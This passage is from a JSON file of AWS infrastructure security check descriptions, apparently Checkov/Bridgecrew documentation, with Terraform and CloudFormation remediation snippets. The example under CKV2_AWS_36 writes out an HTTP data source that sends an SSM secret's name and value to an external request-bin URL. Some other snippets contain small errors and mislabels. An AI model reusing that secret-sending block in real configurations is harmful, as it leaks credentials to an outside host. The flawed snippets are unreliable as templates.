        "description": "Ensure Postgres RDS as aws_db_instance has Query Logging enabled\nDescription\nThis check ensures that you have enabled query logging set up for your PostgreSQL database instance. An instance needs to have a non-default parameter group and two parameters set - that of log_statement and log_min_duration_statement, these need to be set to all and 1 respectively to get sufficient logs.\n Note\nSetting querying logging can expose secrets (including passwords) from your queries, - restrict and encrypt to mitigate. \nFix - Buildtime\nTerraform\nYou will need to have a resource aws_db_instance that refers to your aws_db_parameter_group attribute: parameter_group_name. With that in place the following parameters need to be set: \naws_rds_cluster_parameter_group.examplea.tfresource \"aws_db_parameter_group\" \"examplea\" {\n  name = \"rds-cluster-pg\"\n  family      = \"postgres10\"\n\n+  parameter {\n+    name=\"log_statement\"\n+    value=\"all\"\n+  }\n\n+  parameter {\n+    name=\"log_min_duration_statement\"\n+    value=\"1\"\n+  }\n}\n\nFor more details see the aws docs here: https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/USER_LogAccess.Concepts.PostgreSQL.html",
        "severity": "LOW"
    },
    "CKV_AWS_21": {
        "url": "https://docs.bridgecrew.io/docs/s3_16-enable-versioning",
        "description": "AWS S3 object versioning is disabled\nDescription\nS3 versioning is a managed data backup and recovery service provided by AWS. When enabled it allows users to retrieve and restore previous versions of their buckets. \nS3 versioning can be used for data protection and retention scenarios such as recovering objects that have been accidentally/intentionally deleted or overwritten.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon S3 console.\nSelect the bucket that you want to configure. \nSelect the Properties tab.\nNavigate to the Permissions section.\nSelect Edit bucket policy. If the selected bucket does not have an access policy, click Add bucket policy.\nSelect the Versioning tab from the Properties panel, and expand the feature configuration section. \nTo activate object versioning for the selected bucket, click Enable Versioning, then click OK. The feature status should change to versioning is currently enabled on this bucket.\n\nFix - Buildtime \nTerraform\nResource: aws_s3_bucket\nAttribute: version/enabled\naws_s3_bucket.state_bucket.tfresource \"aws_s3_bucket\" \"state_bucket\" {\n  bucket        = \"${data.aws_caller_identity.current.account_id}-terraform-state\"\n  acl           = var.acl\n  force_destroy = var.force_destroy\n\n+  versioning {\n+    enabled    = true\n+  }\n\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        sse_algorithm = var.sse_algorithm\n      }\n    }\n  }\n\n  tags = var.common_tags\n}\n",
        "severity": "HIGH"
    },
    "CKV2_AWS_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-api-gateway-stage-have-logging-level-defined-as-appropiate",
        "description": "API Gateway stage does not have logging level defined appropriately\nDescription\nIt is generally a good practice to define the logging level for your API Gateway stages appropriately because it allows you to capture and review detailed information about the requests and responses handled by your API. This can be especially useful for debugging issues, analyzing the usage patterns of your API, and identifying potential performance bottlenecks.\nBy default, the logging level for API Gateway stages is set to \"OFF\", which means that no logs are generated. You can choose to enable logging at the \"ERROR\" level, which will capture only log entries that correspond to error responses generated by your API. Alternatively, you can enable logging at the \"INFO\" level, which will capture log entries for both error responses and successful requests.\nFix - Buildtime \nTerraform\n\nResources: aws_api_gateway_rest_api, aws_api_gateway_deployment, aws_api_gateway_method_settings\n\nGoresource \"aws_api_gateway_rest_api\" \"ok_example\" {\n  body = jsonencode({\n    openapi = \"3.0.1\"\n    info = {\n      title   = \"ok_example\"\n      version = \"1.0\"\n    }\n    paths = {\n      \"/path1\" = {\n        get = {\n          x-amazon-apigateway-integration = {\n            httpMethod           = \"GET\"\n            payloadFormatVersion = \"1.0\"\n            type                 = \"HTTP_PROXY\"\n            uri                  = \"https://ip-ranges.amazonaws.com/ip-ranges.json\"\n          }\n        }\n      }\n    }\n  })\n\n  name = \"ok_example\"\n}\n\nresource \"aws_api_gateway_deployment\" \"ok_example\" {\n  rest_api_id = aws_api_gateway_rest_api.ok_example.id\n\n  triggers = {\n    redeployment = sha1(jsonencode(aws_api_gateway_rest_api.ok_example.body))\n  }\n\n  lifecycle {\n    create_before_destroy = true\n  }\n}\n\nresource \"aws_api_gateway_stage\" \"ok_example\" {\n  deployment_id = aws_api_gateway_deployment.ok_example.id\n  rest_api_id   = aws_api_gateway_rest_api.ok_example.id\n  stage_name    = \"ok_example\"\n}\n\nresource \"aws_api_gateway_method_settings\" \"all\" {\n  rest_api_id = aws_api_gateway_rest_api.ok_example.id\n  stage_name  = aws_api_gateway_stage.ok_example.stage_name\n  method_path = \"*/*\"\n\n  settings {\n    metrics_enabled = true\n    logging_level   = \"ERROR\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-security-groups-are-attached-to-ec2-instances-or-elastic-network-interfaces-enis",
        "description": "Security Groups are not attached to EC2 instances or ENIs\nDescription\nSecurity groups are an important layer of security for Amazon EC2 instances and network interfaces (ENIs). They act as a virtual firewall for your instances, controlling inbound and outbound traffic to and from your instances. By attaching security groups to your EC2 instances or ENIs, you can specify which traffic is allowed to reach your instances, and which traffic is blocked. This can help to protect your instances from unauthorized access and prevent potential security vulnerabilities.\nFix - Buildtime \nTerraform\n\nResource: aws_network_interface, aws_instance, aws_security_group\nArgument: security_groups of aws_instance or aws_security_group\n\nGoresource \"aws_network_interface\" \"test\" {\n  subnet_id       = \"aws_subnet.public_a.id\"\n  security_groups = [aws_security_group.ok_sg.id]\n}\n\nresource \"aws_instance\" \"test\" {\n  ami           = \"data.aws_ami.ubuntu.id\"\n  instance_type = \"t3.micro\"\n  security_groups = [aws_security_group.ok_sg.id]\n}\n\nresource \"aws_security_group\" \"ok_sg\" {\n  ingress {\n    description = \"TLS from VPC\"\n    from_port   = 443\n    to_port     = 443\n    protocol    = \"tcp\"\n    cidr_blocks = 0.0.0.0/0\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_31": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_33",
        "description": "AWS WAF2 does not have a Logging Configuration\nDescription\nYou can enable comprehensive logging on a web access control list (web ACL) using an Amazon Kinesis Data Firehose stream destined to an Amazon S3 bucket in the same Region. To do so, you must use three AWS services:\nAWS WAF to create the logs\nKinesis Data Firehose to receive the logs\nAmazon S3 to store the logs\nNote: AWS WAF and Kinesis Data Firehose must be running in the same Region.\nFix - Buildtime\nTerraform\n\nResource: aws_wafv2_web_acl\nAttribute: visibility_config - (Required) Defines and enables Amazon CloudWatch metrics and web request sample collection. See Visibility Configuration below for details.\n\nGoresource \"aws_wafv2_web_acl\" \"example\" {\n  name        = \"rate-based-example\"\n  description = \"Example of a rate based statement.\"\n  scope       = \"REGIONAL\"\n\n  ...\n++    visibility_config {\n      cloudwatch_metrics_enabled = false\n      metric_name                = \"friendly-rule-metric-name\"\n      sampled_requests_enabled   = false\n    }\n  }\n\n++ resource \"aws_wafv2_web_acl_logging_configuration\" \"example\" {\n  log_destination_configs = [aws_kinesis_firehose_delivery_stream.example.arn]\n  resource_arn            = aws_wafv2_web_acl.example.arn\n  redacted_fields {\n    single_header {\n      name = \"user-agent\"\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_42": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-distribution-uses-custom-ssl-certificate",
        "description": "AWS CloudFront web distribution with default SSL certificate\nDescription\nThis policy identifies CloudFront web distributions which have a default SSL certificate to access CloudFront content. It is a best practice to use custom SSL Certificate to access CloudFront content. It gives you full control over the content data. custom SSL certificates also allow your users to access your content by using an alternate domain name. You can use a certificate stored in AWS Certificate Manager (ACM) or you can use a certificate stored in IAM.\nFix - Buildtime\nTerraform\nGoresource \"aws_cloudfront_distribution\" \"pass_1\" {\n\n  origin {\n    domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n    origin_id   = \"primaryS3\"\n\n    s3_origin_config {\n      origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n    }\n  }\n\n  default_cache_behavior {\n   target_origin_id = \"groupS3\"\n  }\n\n  viewer_certificate {\n    acm_certificate_arn = \"aaaaa\"\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_144": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-s3-bucket-has-cross-region-replication-enabled",
        "description": "S3 bucket cross-region replication disabled\nDescription\nCross-region replication enables automatic, asynchronous copying of objects across S3 buckets. By default, replication supports copying new S3 objects after it is enabled. It is also possible to use replication to copy existing objects and clone them to a different bucket, but in order to do so, you must contact AWS Support.\nFix - Buildtime \nTerraform\n\nResource: aws_s3_bucket\nArgument: replication_configuration\n\naws_s3_bucket.test.tfresource \"aws_s3_bucket\" \"test\" {\n  ...\n+  replication_configuration {\n+    role = aws_iam_role.replication.arn\n+    rules {\n+      id     = \"foobar\"\n+      prefix = \"foo\"\n+      status = \"Enabled\"\n+\n+      destination {\n+        bucket        = aws_s3_bucket.destination.arn\n+        storage_class = \"STANDARD\"\n+      }\n+    }\n+  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_36": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-terraform-does-not-send-ssm-secrets-to-untrusted-domains-over-http",
        "description": "AWS Terraform sends SSM secrets to untrusted domains over HTTP\nDescription\nSending secrets such as passwords and encryption keys over an untrusted network or domain can increase the risk of those secrets being intercepted and compromised. This is because the secrets may not be encrypted while in transit, making it easier for attackers to intercept and read them.\nBy ensuring that AWS Terraform does not send secrets to untrusted domains over HTTP, you can help protect the confidentiality of your secrets and reduce the risk of them being compromised. Instead, you should use secure protocols such as HTTPS or SSL/TLS to transmit secrets, as these protocols can help protect the secrecy of the secrets in transit.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_ssm_parameter\" \"param2\" {\n  name = var.parameter_name\n  type = \"String\"\n  value = \"foo\"\n}\n\ndata \"http\" \"nonleak2\" {\n  url = \"https://enp840cyx28ip.x.pipedream.net/?id=${aws_ssm_parameter.param2.name}&content=${aws_ssm_parameter.param2.value}\"\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_15": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-auto-scaling-groups-that-are-associated-with-a-load-balancer-are-using-elastic-load-balancing-health-checks",
        "description": "Auto scaling groups associated with a load balancer do not use elastic load balancing health checks\nDescription\n To maintain the availability of the compute resources in the event of a failure and provide an evenly distributed application load ,ensure that your Amazon Auto Scaling Groups (ASGs) have associated Elastic Load Balancers in order. \nFix - Buildtime \nTerraform\n\nResource: aws_autoscaling_group, aws_autoscaling_attachment, aws_elb\nArgument: autoscaling_group_name and elb of aws_autoscaling_attachment\n\nGoresource \"aws_autoscaling_group\" \"autoscalling_ok\" {\n  max_size                  = 5\n  min_size                  = 2\n  health_check_grace_period = 300\n  health_check_type         = \"ELB\"\n  desired_capacity          = 4\n  force_delete              = true\n\n  lifecycle {\n    ignore_changes = [load_balancers, target_group_arns]\n  }\n}\n\nresource \"aws_autoscaling_attachment\" \"test_ok_attachment\" {\n  autoscaling_group_name = aws_autoscaling_group.autoscalling_ok.id\n  elb                    = aws_elb.test_ok.id\n}\n\nresource \"aws_elb\" \"test_ok\" {\n  name               = \"foobar-terraform-elb\"\n  availability_zones = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n\n  access_logs {\n    bucket        = \"foo\"\n    bucket_prefix = \"bar\"\n    interval      = 60\n  }\n\n  listener {\n    instance_port     = 8000\n    instance_protocol = \"http\"\n    lb_port           = 80\n    lb_protocol       = \"http\"\n  }\n\n  listener {\n    instance_port      = 8000\n    instance_protocol  = \"http\"\n    lb_port            = 443\n    lb_protocol        = \"https\"\n    ssl_certificate_id = \"arn:aws:iam::123456789012:server-certificate/certName\"\n  }\n\n  health_check {\n    healthy_threshold   = 2\n    unhealthy_threshold = 2\n    timeout             = 3\n    target              = \"HTTP:8000/\"\n    interval            = 30\n  }\n\n  instances                   = [aws_instance.foo.id]\n  cross_zone_load_balancing   = true\n  idle_timeout                = 400\n  connection_draining         = true\n  connection_draining_timeout = 400\n\n  tags = {\n    Name = \"foobar-terraform-elb\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_19": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-all-eip-addresses-allocated-to-a-vpc-are-attached-to-ec2-instances",
        "description": "Not all EIP addresses allocated to a VPC are attached to EC2 instances\nDescription\nEnsure that an Elastic IP (EIP) is allocated for each NAT gateway that you want to deploy within your AWS account. An EIP address is a static, public IP address designed for dynamic cloud computing. You can associate an AWS EIP address with any EC2 instance, VPC ENI or NAT gateway. A Network Address Translation (NAT) gateway is a device that helps enabling EC2 instances in a private subnet to connect to the Internet and prevent the Internet from initiating a connection with those instances. With Elastic IPs, you can mask the failure of an EC2 instance by rapidly remapping the address to another instance launched in your VPC\nFix - Buildtime\nTerraform\n\nResource: aws_eip, aws_instance\nArgument: instance and vpc of aws_eip\n\nGoresource \"aws_eip\" \"ok_eip\" {\n  instance = aws_instance.ec2.id\n  vpc      = true\n}\n\nresource \"aws_instance\" \"ec2\" {\n  ami               = \"ami-21f78e11\"\n  availability_zone = \"us-west-2a\"\n  instance_type     = \"t2.micro\"\n\n  tags = {\n    Name = \"HelloWorld\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-only-encrypted-ebs-volumes-are-attached-to-ec2-instances",
        "description": "Not only encrypted EBS volumes are attached to EC2 instances\nDescription\nEncrypting your AWS EBS volumes helps protect your data from unauthorized access or tampering. That way, you can ensure that only authorized users can access and modify the contents of your volumes. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_volume_attachment, aws_instance, aws_ebs_volume\nArgument: volume_id and instance_id of aws_volume_attachment\n\nGoresource \"aws_instance\" \"web\" {\n  ami               = \"ami-21f78e11\"\n  availability_zone = \"us-west-2a\"\n  instance_type     = \"t2.micro\"\n\n  tags = {\n    Name = \"HelloWorld\"\n  }\n}\n\nresource \"aws_volume_attachment\" \"ok_attachment1\" {\n  device_name = \"/dev/sdh3\"\n  volume_id   = aws_ebs_volume.ok_ebs2.id\n  instance_id = aws_instance.web.id\n}\n\n\nresource \"aws_ebs_volume\" \"ok_ebs2\" {\n  availability_zone = \"\"\n  encrypted = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_105": {
        "url": "https://docs.bridgecrew.io/docs/ensure-redshift-uses-ssl",
        "description": "Redshift does not use SSL\nDescription\nThis policy identifies Redshift databases in which data connection to and from is occurring on an insecure channel. SSL connections ensures the security of the data in transit.\nFix - Runtime\nAWS Console\n\nLogin to the AWS and navigate to the Amazon Redshift service.\nExpand the identified Redshift cluster and make a note of the Cluster Parameter Group\nIn the navigation panel, click on the Parameter group.\nSelect the identified Parameter Group and click on Edit Parameters.\nReview the require_ssl flag. Update the parameter require_ssl to true and save it.\nNote: If the current parameter group is a Default parameter group, it cannot be edited. You will need to create a new parameter group and point it to an affected cluster.\n\nFix - Buildtime \nTerraform\n\nResource: aws_redshift_parameter_group\nArgument:  parameter.require_ssl\n\naws_s3_bucket.test.tfresource \"aws_redshift_parameter_group\" \"pass\" {\n    ...\n  parameter {\n    name  = \"require_ssl\"\n    value = \"true\"\n  }\n}\n\nCloudFormation\n\nResource: AWS::Redshift::ClusterParameterGroup\nArgument:  Properties.Parameters\n\nYAMLType: AWS::Redshift::ClusterParameterGroup\n    Properties:\n      ...\n      Parameters:\n+       - ParameterName: \"require_ssl\"\n+         ParameterValue: \"true\"\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_33": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-appsync-is-protected-by-waf",
        "description": "AWS AppSync is not protected by WAF\nDescription\nEnsuring that your AWS AppSync API is protected by a Web Application Firewall (WAF) can help to improve the security of your API by protecting against common web vulnerabilities such as SQL injection attacks and cross-site scripting (XSS) attacks by inspecting incoming requests and blocking those that contain malicious payloads. It can also help to prevent DDoS attacks by allowing you to set rate-based rules that limit the number of requests that an IP address can send to your API within a specified time period.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_appsync_graphql_api\" \"pass\" {\n  authentication_type = \"API_KEY\"\n  name                = \"example\"\n}\n\nresource \"aws_wafv2_web_acl_association\" \"pass\" {\n  resource_arn = aws_appsync_graphql_api.pass.arn\n  web_acl_arn  = aws_wafv2_web_acl.example.arn\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_20": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-alb-redirects-http-requests-into-https-ones",
        "description": "ALB does not redirect HTTP requests into HTTPS ones\nDescription\nEnsure that the behaviour of the Load balancer is redirect any traffic from the encrypted endpoint rather than handling on http or failing to respond.\nFix - Buildtime \nTerraform\n\nResource: aws_lb, aws_lb_listener\nArgument: redirect of  aws_lb_listener\n\nGoresource \"aws_lb\" \"lb_good\" {\n}\n\n\nresource \"aws_lb_listener\" \"listener_good\" {\n  load_balancer_arn = aws_lb.lb_good.arn\n  port              = \"80\"\n  protocol          = \"HTTP\"\n\n  default_action {\n    type = \"redirect\"\n\n    redirect {\n      port        = \"443\"\n      protocol    = \"HTTPS\"\n      status_code = \"HTTP_301\"\n    }\n\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_106": {
        "url": "https://docs.bridgecrew.io/docs/ensure-ebs-default-encryption-is-enabled",
        "description": "EBS default encryption is disabled\nDescription\nThis policy identifies AWS regions in which new EBS volumes are getting created without any encryption. Encrypting data at rest reduces unintentional exposure of data stored in EBS volumes. It is recommended to configure EBS volume at the regional level so that every new EBS volume created in that region will be enabled with encryption by using a provided encryption key.\nFix - Runtime\nAWS Console\nTo enable encryption at region level by default, follow below URL:\nhttps://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default\nAdditional Information:\nTo detect existing EBS volumes that are not encrypted ; refer Saved Search:\nAWS EBS volumes are not encrypted_RL\nTo detect existing EBS volumes that are not encrypted with CMK, refer Saved Search:\nAWS EBS volume not encrypted using Customer Managed Key_RL\nFix - Buildtime \nTerraform\n\nResource: aws_ebs_encryption_by_default\nArgument:  enabled\n\naws_s3_bucket.test.tfresource \"aws_ebs_encryption_by_default\" \"enabled\" {\n+ enabled = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_158": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-cloudwatch-log-group-is-encrypted-by-kms",
        "description": "CloudWatch Log groups encrypted using default encryption key instead of KMS CMK\nDescription\nLog group data requires mandatory encryption settings in CloudWatch Logs. Developers can optionally use AWS Key Management Service for this encryption. This approach has several limitations:\n\nIf you revoke CloudWatch Logs access to an associated CMK or delete an associated CMK, your encrypted data in CloudWatch Logs can no longer be retrieved. \nYou cannot associate a CMK with a log group using the CloudWatch console.\n\nFix - Buildtime \nTerraform\n\nResource: aws_cloudwatch_log_group\nArgument:  kms_key_id\n\n\ud83d\udcd8NoteResource's ARN should be used.\naws_s3_bucket.test.tfresource \"aws_cloudwatch_log_group\" \"pass\" {\n  ...\n+ kms_key_id        = \"someKey\"\n}\n\nCloudFormation\n\nResource: AWS::Logs::LogGroup\nArgument:  Properties.KmsKeyId\n\nYAMLType: AWS::Logs::LogGroup\n    Properties: \n      ...\n+     KmsKeyId: \"someKey\"\n",
        "severity": "LOW"
    },
    "CKV_AWS_160": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-timestream-database-is-encrypted-with-kms-cmk",
        "description": "Timestream database is not encrypted with KMS CMK\nDescription\nTimestream encryption at rest provides enhanced security by encrypting all your data at rest using encryption keys stored in AWS Key Management Service (AWS KMS). This functionality helps reduce the operational burden and complexity involved in protecting sensitive data. With encryption at rest, you can build security-sensitive applications that meet strict encryption compliance and regulatory requirements.\nAWS KMS is required for encryption at rest in Timestream. Using a customer managed key in KMS to encrypt your Timestream data is recommended, in order to have more control over the permissions and lifecycle of your keys, including the ability to have them automatically rotated on an annual basis.\nFix - Buildtime \nTerraform\n\nResource: aws_timestreamwrite_database\nArgument:  kms_key_id\n\naws_s3_bucket.test.tfresource \"aws_timestreamwrite_database\" \"test\" {\n    ...\n+ kms_key_id = var.kms_key_id\n}\n\nCloudFormation\n\nResource: AWS::Timestream::Database\nArgument:  Properties.KmsKeyId\n\nYAMLType: AWS::Timestream::Database\n    Properties:\n      ...\n+     KmsKeyId: kms-key-id\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_29": {
        "url": "https://docs.bridgecrew.io/docs/ensure-public-api-gateway-are-protected-by-waf",
        "description": "Public API gateway not configured with AWS Web Application Firewall v2 (AWS WAFv2)\nDescription\nAWS WAF is a web application firewall service that helps protect your web applications and APIs from common web exploits that could affect your application's availability, integrity, or confidentiality.\nBy attaching AWS WAF to your public API gateway, you can create rules that block or allow traffic based on the characteristics of the traffic, such as the IP address, the HTTP method, or the values of specific headers. This can help to protect your API from common web exploits such as SQL injection attacks, cross-site scripting attacks, and other types of malicious traffic.\nFix - Buildtime\nTerraform\nGoresource \"aws_api_gateway_rest_api\" \"edge\" {\n  name = var.name\n\n  policy = \"\"\n\n  endpoint_configuration {\n    types = [\"EDGE\"]\n  }\n}\n\nresource \"aws_api_gateway_stage\" \"wafv2_edge\" {\n  deployment_id = aws_api_gateway_deployment.example.id\n  rest_api_id   = aws_api_gateway_rest_api.edge.id\n  stage_name    = \"example\"\n}\n\nresource \"aws_wafv2_web_acl_association\" \"edge\" {\n  resource_arn = aws_api_gateway_stage.wafv2_edge.arn\n  web_acl_id   = aws_wafv2_web_acl.foo.id\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_165": {
        "url": "https://docs.bridgecrew.io/docs/ensure-dynamodb-point-in-time-recovery-is-enabled-for-global-tables",
        "description": "Dynamodb point in time recovery is not enabled for global tables\nDescription\nEnabling point-in-time recovery (PITR) for Amazon DynamoDB global tables can help to protect against data loss due to accidental write or delete operations, or due to data corruption. With PITR enabled, you can restore a global table to any point in time within the specified recovery window (typically up to 35 days). This can be helpful if you need to undo unintended changes or recover from data corruption.\nFix - Buildtime \nCloudFormation\n\nResource:  AWS::DynamoDB::GlobalTable\nArgument: Properties.DistributionConfig.Logging/Bucket\n\nYAMLResources:\n  MyCloudFrontDistribution:\n    Type: AWS::DynamoDB::GlobalTable\n    Properties: \n            ...\n      Replicas: \n+       - PointInTimeRecoverySpecification: \n+           - PointInTimeRecoveryEnabled\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_170": {
        "url": "https://docs.bridgecrew.io/docs/ensure-qldb-ledger-permissions-mode-is-set-to-standard-1",
        "description": "QLDB ledger permissions mode is not set to STANDARD\nDescription\nAmazon Quantum Ledger Database (Amazon QLDB) is a fully managed ledger database for cryptographically verifiable transaction logging. You can use the QLDB API or the AWS Command Line Interface (AWS CLI) to create, update, and delete ledgers in Amazon QLDB. You can also list all the ledgers in your account, or get information about a specific ledger.\nFix - Buildtime \nTerraform\n\nResource: aws_qldb_ledger\nArgument:  permissions_mode\n\naws_s3_bucket.test.tfresource \"aws_qldb_ledger\" \"standard\" {\n  ...\n+ permissions_mode = \"STANDARD\"\n}\n\nCloudFormation\n\nResource: AWS::QLDB::Ledger\nArgument:  Properties.PermissionsMode\n\nYAMLResources:\n  Default:\n    Type: \"AWS::QLDB::Ledger\"\n    Properties:\n      ...\n+     PermissionsMode: \"STANDARD\"\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_22": {
        "url": "https://docs.bridgecrew.io/docs/ensure-an-iam-user-does-not-have-access-to-the-console-group",
        "description": "IAM User has access to the console\nDescription\nIt is generally a good security practice to ensure that IAM users do not have access to the AWS Management Console. This can help to reduce the risk of unauthorized access to your AWS resources and prevent potential data breaches. By denying console access to IAM users, you can ensure that only authorized administrators have access to the console.\nFix - Buildtime\nTerraform\nGoresource \"aws_iam_user\" \"pass\" {\n  name = \"tech-user\"\n}\n\nresource \"aws_iam_user_login_profile\" \"fail\" {\n  user    = aws_iam_user.fail.name\n}\n\n##not connected with pgp_key value\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_178": {
        "url": "https://docs.bridgecrew.io/docs/ensure-fx-ontap-file-system-is-encrypted-by-kms-using-a-customer-managed-key-cmk",
        "description": "AWS fx ontap file system not encrypted using Customer Managed Key\nDescription\nThis is a simple check to ensure that  fx ontap file system is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster\nFix - Buildtime\nTerraform\nResource: aws_fsx_ontap_file_system\nAttribute: kms_key_id - (Optional) ARN for the KMS Key to encrypt the file system at rest, Defaults to an AWS managed KMS Key.\nGoresource \"aws_fsx_ontap_file_system\" \"test\" {\n  storage_capacity    = 1024\n  subnet_ids          = [aws_subnet.test1.id, aws_subnet.test2.id]\n  deployment_type     = \"MULTI_AZ_1\"\n  throughput_capacity = 512\n  preferred_subnet_id = aws_subnet.test1.id\n  + kms_key_id        = \"ckv_kms\"\n}\n",
        "severity": "TBD"
    },
    "CKV_AWS_19": {
        "url": "https://docs.bridgecrew.io/docs/s3_14-data-encrypted-at-rest",
        "description": "Data stored in the S3 bucket is not securely encrypted at rest\nDescription\nSSE helps prevent unauthorized access to S3 buckets. Encrypting and decrypting data at the S3 bucket level is transparent to users when accessing data.\nFix - Runtime \nAWS Console\nTo change the policy using the AWS Console, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the Amazon S3 console.\nSelect the name of the bucket that you want from the Bucket name list.\nSelect Properties.\nSelect Default encryption.\nTo use keys that are managed by Amazon S3 for default encryption, select AES-256, then select Save.\nIf you want to use CMKs that are stored in AWS KMS for default encryption, follow these steps:\nSelect AWS-KMS.\nSelect a customer-managed AWS KMS CMK that you have created, using one of these methods:\na) In the list that appears, select the AWS KMS CMK.\nb) In the list that appears, select Custom KMS ARN, and then enter the Amazon Resource Name of the AWS KMS CMK.\nClick Save.\n\n\nThe steps above will encrypt all new files going forward. To encrypt all existing files, follow the steps below. Note that this will appear as an object modification, which will be logged if access logging is configured, and will count as a bucket write operation for billing purposes. Be mindful of applying these steps on large buckets.\n\nNavigate to the bucket Overview tab.\nSelect objects to encrypt.\nFrom the Actions dropdown, select Change encryption.\nSelect the desired encryption method, then click Save.\nThe progress bar for the background job displays at the bottom of the screen.\n\nCLI Command\nTo set encryption at the bucket level for all new objects, use the following command:\nShellaws s3api put-bucket-encryption \n--bucket awsexamplebucket \n--server-side-encryption-configuration \n'{\"Rules\": [{\"ApplyServerSideEncryptionByDefault\": {\"SSEAlgorithm\": \"AES256\"}}]}'\n\nThe command above will not encrypt existing objects. To do so, you must re-add each file with encryption. You can copy a single object back to itself encrypted with SSE-S3 (server-side encryption with Amazon S3-managed keys), using the following S3 Encrypt command:\nShellaws s3 cp s3://awsexamplebucket/myfile s3://awsexamplebucket/myfile --sse AES256\n\nFix - Buildtime\nTerraform\n\nResource: aws_s3_bucket\nArgument: server_side_encryption_configuration\n\nGoresource \"aws_s3_bucket\" \"example\" {\n  ...\n+ server_side_encryption_configuration {\n+   rule {\n+       apply_server_side_encryption_by_default {\n+       sse_algorithm = \"AES256\"\n+       }\n+   }\n+   }\n}\n\nCloudFormation\n\nResource: AWS::S3::Bucket\nArgument: Properites.BucketEncryption\n\nYAMLType: AWS::S3::Bucket\n    Properties:\n        ...\n+       BucketEncryption:\n+           ServerSideEncryptionConfiguration:\n+               - ServerSideEncryptionByDefault:\n+                   SSEAlgorithm: AES256\n",
        "severity": "LOW"
    },
    "CKV_AWS_185": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_105",
        "description": "AWS Kinesis streams encryption is using default KMS keys instead of Customer's Managed Master Keys\nDescription\nThis policy identifies the AWS Kinesis streams which are encrypted with default KMS keys and not with Master Keys managed by Customer. It is a best practice to use customer managed Master Keys to encrypt your Amazon Kinesis streams data. It gives you full control over the encrypted data.\nFix - Runtime\nAWS Console\n\nSign in to the AWS Console\nGo to Kinesis Service\nSelect the reported Kinesis data stream for the corresponding region\nUnder Server-side encryption, Click on Edit\nChoose Enabled\nUnder KMS master key, You can choose any KMS other than the default (Default) aws/kinesis\nClick Save\n\nFix - Buildtime\nTerraform\n\nResource: aws_kinesis_stream\nArguments: kms_key_id\n\nGoresource \"aws_kinesis_stream\" \"pass\" {\n  ...\n  kms_key_id      = aws_kms_key.sse_aws_kms_key_id.id\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_20": {
        "url": "https://docs.bridgecrew.io/docs/s3_1-acl-read-permissions-everyone",
        "description": "Bucket ACL grants READ permission to everyone\nDescription\nUnprotected S3 buckets are one of the major causes of data theft and intrusions. An S3 bucket that allows READ access to everyone can provide attackers the ability to read object data within the bucket, which can lead to the exposure of sensitive data. The only S3 buckets that should be globally accessible for unauthenticated users or for Any AWS Authenticate Users are those used for hosting static websites. Bucket ACL helps manage access to S3 bucket data. \nWe recommend AWS S3 buckets are not publicly accessible for READ actions to protect S3 data from unauthorized users and exposing sensitive data to public access. \nFix - Runtime \nProcedure\nS3 buckets should be protected by using the bucket ACL and bucket policies. If you want to share data with other users via S3 buckets create pre-signed URLs with a short expiration duration. \nTo generate a pre-signed URL for the file samplefile.zip, use the following command:\nBashaws s3 presign --expires-in 36000 s3://sharedfolder/samplefile.zip\n\nTo generate pre-signed URLS for every object in an S3 bucket, use the following command:\nBashwhile read line; do aws s3 presign --expires-in 36000 s3://sharedfolder/$line; done\n\n\ud83d\udcd8NoteFor all automation-related work use the bucket policy and grant access to the required roles.\nFix - Buildtime \nTerraform\n\nResource: aws_s3_bucket.data\nArgument: acl\n\nTerraformresource \"aws_s3_bucket\" \"data\" {\n    ...\n  bucket        = \"${local.resource_prefix.value}-data\"\n-  acl           = \"public-read\"\n+  acl           = 